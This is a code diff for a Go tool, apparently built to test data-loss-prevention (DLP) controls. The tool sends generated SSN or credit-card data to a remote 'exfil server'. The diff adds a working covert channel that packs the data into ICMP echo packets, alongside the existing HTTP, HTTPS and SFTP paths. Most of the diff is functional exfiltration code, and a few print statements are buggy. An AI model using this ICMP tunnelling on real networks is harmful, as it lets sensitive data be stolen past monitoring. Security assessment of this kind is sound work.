@@ -29,10 +29,13 @@ import (
 	"strings"
 	//"encoding/json"
 	"ego-assess/data"
+	"encoding/binary"
+	"errors"
 	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 	"io/ioutil"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"time"
@@ -50,6 +53,101 @@ type Client struct {
 	Username string
 	Password string
 	Data     *bytes.Buffer
+}
+
+//icmp stuff
+
+//icmp报文struct
+type icmp struct {
+	Type       uint8
+	Code       uint8
+	Checksum   uint16
+	Identifier uint16
+	Sequence   uint16
+	data       [1016]byte
+}
+
+// Ping public method
+func Ping(ip string, data []byte) (bool, error) {
+	recv := make([]byte, 1024)                //保存响应数据
+	raddr, err := net.ResolveIPAddr("ip", ip) //raddr为目标主机的地址
+	if err != nil {
+		fmt.Sprintf("resolve ip: %s fail:", ip)
+		return false, err
+	}
+	laddr := net.IPAddr{IP: net.ParseIP("0.0.0.0")} //源地址
+	if ip == "" {
+		return false, errors.New("ip or domain is null")
+	}
+
+	conn, err := net.DialIP("ip4:icmp", &laddr, raddr)
+	if err != nil {
+		return false, err
+	}
+	defer conn.Close()
+
+	buffer := assemblyIcmp(data)
+	if _, err := conn.Write(buffer.Bytes()); err != nil {
+		fmt.Sprintf("post Icmp fail: %v", err)
+		return false, err
+	}
+
+	conn.SetReadDeadline((time.Now().Add(time.Second * 5)))
+	_, err = conn.Read(recv)
+	if err != nil {
+		fmt.Sprintf("get Icmp fail: %v", err)
+		return false, nil
+	}
+
+	return true, nil
+}
+
+/*
+求校验和步骤：
+（1）把校验和字段置为0；
+（2）把需校验的数据看成以16位为单位的数字组成，依次进行二进制反码求和；
+（3）把得到的结果存入校验和字段中。
+*/
+func checkSum(data []byte) uint16 {
+	var (
+		sum    uint32
+		length = len(data)
+		index  int
+	)
+	for length > 1 {
+		sum += uint32(data[index])<<8 + uint32(data[index+1])
+		index += 2
+		length -= 2
+	}
+	if length > 0 {
+		sum += uint32(data[index])
+	}
+	sum += (sum >> 16)
+
+	return uint16(^sum)
+}
+
+func assemblyIcmp(data []byte) bytes.Buffer {
+	var icmpPack icmp
+	var buffer bytes.Buffer //数据缓冲
+
+	icmpPack.Type = 8
+	icmpPack.Code = 0
+	icmpPack.Checksum = 0 //计算Checksum之前置为0
+	icmpPack.Identifier = 0
+	icmpPack.Sequence = 0
+	//copy the data into the buffer
+	copy(icmpPack.data[:], data)
+
+	//计算校验和
+	binary.Write(&buffer, binary.BigEndian, icmpPack) //写入ICMP头
+	//binary.Write(&buffer, binary.BigEndian, Data)     //写入自定义数据
+	icmpPack.Checksum = checkSum(buffer.Bytes())
+	buffer.Reset() //清空buffer
+
+	//生成最终发送数据
+	binary.Write(&buffer, binary.BigEndian, icmpPack) //写入ICMP头
+	return buffer
 }
 
 /*
@@ -207,6 +305,40 @@ func (client Client) transmitHTTPS() {
 	log.Printf(sb)
 }
 
+//sets up the necessary things to transmit ICMP data
+//WORKING SEND/RECIEVE ICMP!!
+//add logic for base64 encoding and signaliing server to start transfer...
+func (client Client) transmitICMP() {
+	totalPackets := 0
+	bytesRead := 0
+	var icmpSample icmp
+	full := client.Data.Len()
+	//.calcalate total packets
+	if (client.Data.Len() % len(icmpSample.data)) == 0 {
+		totalPackets = (client.Data.Len()) / (len(icmpSample.data))
+	} else {
+		totalPackets = (client.Data.Len())/(len(icmpSample.data)) + 1
+	}
+
+	for {
+		if !(bytesRead < full) {
+			break
+		}
+
+		_, err := Ping(client.Target, client.Data.Next(len(icmpSample.data)))
+		if err != nil {
+			fmt.Printf("Error: %s", err)
+		} else {
+			fmt.Printf("%s Ping ok!\n", client.Target)
+		}
+
+		bytesRead += len(icmpSample.data)
+
+	}
+	fmt.Println("Done pinging!, used %d packets\n", totalPackets)
+
+}
+
 //Interface function - switches between client types
 func (client Client) transmit() {
 	switch client.Protocol {
@@ -214,6 +346,8 @@ func (client Client) transmit() {
 		client.transmitHTTP()
 	case "HTTPS":
 		client.transmitHTTPS()
+	case "ICMP":
+		client.transmitICMP()
 	case "SFTP":
 		client.transmitSFTP()
 	default:
@@ -238,10 +372,10 @@ func main() {
 	)
 
 	//should prob make this by protocol, not port but ehhh
-	flag.StringVar(&exfilProtocol, "protocol", "HTTP", "protocol for exfil")
+	flag.StringVar(&exfilProtocol, "type", "HTTP", "protocol type for exfil (HTTP/HTTPS/SFTP)")
 	flag.StringVar(&remoteHost, "target", "127.0.0.1", "target host/exfil server")
 	flag.StringVar(&remotePort, "port", "8080", "remote server exfil port")
-	flag.StringVar(&username, "user", "testuser", "username (for SSH/SFTP")
+	flag.StringVar(&username, "user", "testuser", "username (for SSH/SFTP)")
 	flag.StringVar(&password, "password", "test1234", "password (for SSH/SFTP)")
 	flag.StringVar(&dataType, "datatype", "ssn", "type of data for exfil (SSN or CC)")
 	flag.IntVar(&dataSize, "size", 10, "size of data file for exfil (in MB)")
